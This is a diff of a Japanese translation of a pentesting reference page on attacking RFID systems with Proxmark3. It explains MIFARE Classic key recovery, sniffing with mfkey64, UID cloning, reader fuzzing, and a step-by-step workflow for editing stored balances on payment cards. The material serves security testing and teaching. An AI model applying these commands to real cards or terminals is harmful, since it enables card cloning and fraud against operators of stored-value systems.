@@ -2,17 +2,17 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Proxmark3 を使った RFID システムの攻撃
+## Proxmark3によるRFIDシステムへの攻撃
 
-The first thing you need to do is to have a [**Proxmark3**](https://proxmark.com) and [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).
+最初に、[**Proxmark3**](https://proxmark.com)を用意し、[**softwareとその依存関係をインストール**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)する必要があります。
 
-### MIFARE Classic 1KB への攻撃
+### MIFARE Classic 1KBへの攻撃
 
-それは **16セクタ** を持ち、各セクタは **4ブロック**、各ブロックは **16B** を含みます。UIDはセクタ0ブロック0にあり（変更できません）。\
-各セクタにアクセスするには、各セクタの **ブロック3**（sector trailer）に格納されている **2つのキー**（**A** と **B**）が必要です。セクタトレーラは、2つのキーを使って **各ブロック** に対する **読み取り** と **書き込み** 権限を与える **アクセスビット** も格納しています。\
-2つのキーは、たとえば最初のキーが分かれば読み取り、二番目のキーが分かれば書き込みを許可するといった用途に便利です。
+MIFARE Classic 1KBには**16セクター**があり、各セクターには**4ブロック**、各ブロックには**16B**が含まれています。UIDはセクター0のブロック0にあり、変更できません。\
+各セクターにアクセスするには**2つのキー**（**A**と**B**）が必要で、これらは各セクターの**ブロック3**（セクタートレーラー）に保存されています。セクタートレーラーには、2つのキーを使用して**各ブロックの読み取りおよび書き込み**権限を設定する**アクセスビット**も保存されています。\
+例えば、最初のキーを知っている場合は読み取り、2つ目のキーを知っている場合は書き込みの権限を付与するために、2つのキーが役立ちます。
 
-いくつかの攻撃が実行できます。
+複数の攻撃を実行できます<sup>[[1]](#references)</sup>。
 ```bash
 proxmark3> hf mf #List attacks
 
@@ -31,11 +31,11 @@ proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to
 proxmark3> hf mf eget 01 # Read block 1
 proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
 ```
-The Proxmark3 allows to perform other actions like **eavesdropping** a **Tag to Reader communication** to try to find sensitive data. In this card you could just sniff the communication with and calculate the used key because the **cryptographic operations used are weak** and knowing the plain and cipher text you can calculate it (`mfkey64` tool).
+The Proxmark3 を使用すると、**eavesdropping** によって **Tag to Reader communication** を傍受し、機密データを見つけ出すといった別の操作も実行できます。このカードでは、**cryptographic operations used are weak** であり、平文と暗号文がわかればキーを計算できるため（`mfkey64` tool）、通信を sniff して使用されたキーを計算できます。<sup>[[3]](#references)</sup>
 
-#### MiFare Classic quick workflow for stored-value abuse
+#### MiFare Classic における stored-value abuse の簡易 workflow
 
-When terminals store balances on Classic cards, a typical end-to-end flow is:
+端末が Classic カードに残高を保存する場合、一般的な end-to-end flow は次のとおりです。<sup>[[4]](#references)</sup>
 ```bash
 # 1) Recover sector keys and dump full card
 proxmark3> hf mf autopwn
@@ -49,21 +49,21 @@ proxmark3> hf mf cload -f modified.bin
 # 4) Clone original UID so readers recognize the card
 proxmark3> hf mf csetuid -u <original_uid>
 ```
-注意
+メモ
 
-- `hf mf autopwn` は nested/darkside/HardNested-style 攻撃をオーケストレーションし、鍵を回復し、クライアントの dumps フォルダにダンプを作成します。
-- ブロック0/UID の書き込みは magic gen1a/gen2 カードでのみ動作します。通常の Classic カードでは UID は読み取り専用です。
-- 多くの導入では Classic の「value blocks」や単純なチェックサムが使われています。編集後は、複製・補完されたフィールドやチェックサムが一貫していることを確認してください。
+- `hf mf autopwn` は nested/darkside/HardNested-style attacks を orchestrate し、keys を recover して、client dumps folder に dumps を作成します。
+- block 0/UID の書き込みは magic gen1a/gen2 cards でのみ機能します。通常の Classic cards の UID は read-only です。<sup>[[2]](#references)</sup>
+- 多くの deployment では Classic の "value blocks" または単純な checksums が使用されています。編集後は、重複フィールド、complemented fields、checksums がすべて整合していることを確認してください。
 
-より上位の手法や緩和策については、次を参照してください：
+より高レベルな methodology と mitigations については、以下を参照してください。
 
 {{#ref}}
 pentesting-rfid.md
 {{#endref}}
 
-### Raw コマンド
+### Raw Commands
 
-IoTシステムでは、**非ブランドまたは非商用のタグ**を使用することがあります。その場合、Proxmark3 を使ってタグにカスタムの **生のコマンド** を送信できます。
+IoT systems では、**nonbranded または noncommercial tags** が使用されることがあります。この場合、Proxmark3 を使用して **tags に custom raw commands を送信**できます。
 ```bash
 proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
 SAK : 08 [2]
@@ -73,21 +73,21 @@ No chinese magic backdoor command detected
 Prng detection: WEAK
 Valid ISO14443A Tag Found - Quiting Search
 ```
-この情報を使って、カードやカードと通信する方法について調べてみてください。Proxmark3 は次のような raw コマンドを送信できます: `hf 14a raw -p -b 7 26`
+この情報を使えば、カードに関する情報や、カードとの通信方法を検索できます。Proxmark3 では、次のように raw commands を送信できます: `hf 14a raw -p -b 7 26`
 
-### スクリプト
+### Scripts
 
-Proxmark3 ソフトウェアには、簡単なタスクを実行するために使える **自動化スクリプト** がプリロードされています。完全な一覧を取得するには `script list` コマンドを使用してください。次に `script run` コマンドを使用し、続けてスクリプト名を指定します:
+Proxmark3 software には、単純なタスクを実行するために使用できる **automation scripts** の preloaded list が付属しています。完全なリストを取得するには、`script list` command を使用します。次に、script の名前に続けて `script run` command を使用します:
 ```
 proxmark3> script run mfkeys
 ```
-スクリプトを作成して **fuzz tag readers** を行うことができます。つまり、**valid card** のデータをコピーし、**Lua script** を書いて、1つ以上のランダムな **bytes** を **randomize** し、任意の反復で **reader crashes** するかを確認します。
+**tag readers を fuzz**する script を作成できます。**valid card**のデータをコピーしたら、1つ以上のランダムな**bytes**を**randomize**する**Lua script**を書き、各 iteration で**reader が crash**するか確認するだけです。
 
-## 参考
+## References
 
-- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
-- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
-- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
-- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
+- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
+- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
+- [3] [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
+- [4] [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
 
 {{#include ../../banners/hacktricks-training.md}}
